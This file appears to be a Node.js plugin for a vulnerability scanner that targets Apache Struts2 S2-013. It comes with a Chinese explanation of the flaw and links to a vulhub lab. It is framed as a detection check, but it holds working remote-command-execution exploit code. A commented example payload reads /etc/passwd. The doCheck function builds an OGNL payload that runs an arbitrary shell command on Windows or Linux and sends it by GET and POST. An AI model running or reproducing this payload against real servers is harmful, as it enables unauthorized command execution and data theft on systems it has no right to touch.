module.exports={
	tags:"struts2,013,parms",
	des:"struts2 013漏洞检测",
	VulApps:[
		"https://github.com/vulhub/vulhub/tree/master/struts2/s2-013",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-013.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-013"],
	suport:g_szMyMsg,
/*
/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('cat /etc/passwd').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D
Struts2 标签中 <s:a> 和 <s:url> 都包含一个 includeParams 属性，其值可设置为 none，
get 或 all，参考官方其对应意义如下：
none - 链接不包含请求的任意参数值（默认）
get - 链接只包含 GET 请求中的参数和其值
all - 链接包含 GET 和 POST 所有参数和其值
<s:a>用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。
   在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。

*/
	doCheck:function (url,fnCbk,parms)
	{
		var _t = this;
		parms || (parms={});
		var s = "%{#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
		+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
		+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
		+ ",#p=new java.lang.ProcessBuilder(#cmds)"
		+ ",#as=new java.lang.String()"
		+ ",#p.redirectErrorStream(true),#process=#p.start()"
		+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
		+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()"
		+ ",#f.println(#as)"
		+ ",#f.flush()"
		+ ",#f.close()"
		+"}";
		var a = "";
		for(var k in parms)
			a = a + k + "=" + encodeURIComponent(s) + "&";
		request(fnOptHeader({method: 'GET',uri: url + "?" + a
		    })
		  , function (error, response, body){
		  		if(body)
		  		{
		  			fnDoBody(body,"s2-013",url,null,function(o)
			    	{
			    		var r = {"url":url,"send":a};
		  				fnCbk(global.copyO2O(r,o),_t);
			    	});
		  		}
		    }
		  );
		request(fnOptHeader({method: 'POST',uri: url,
			"formData":{"xt": s}
		    ,headers:
		    {
		    	"User-Agent": g_szUa,
		    	"Content-Type":"application/x-www-form-urlencoded"
		    }})
		  , function (error, response, body){
		  		if(body)
		  		{
		  			fnDoBody(body,"s2-013",url,null,function(o)
			    	{
			    		var r = {"url":url,"send":s};
		  				fnCbk(global.copyO2O(r,o),_t);
			    	});
		  		}
		    }
		  );
	}
};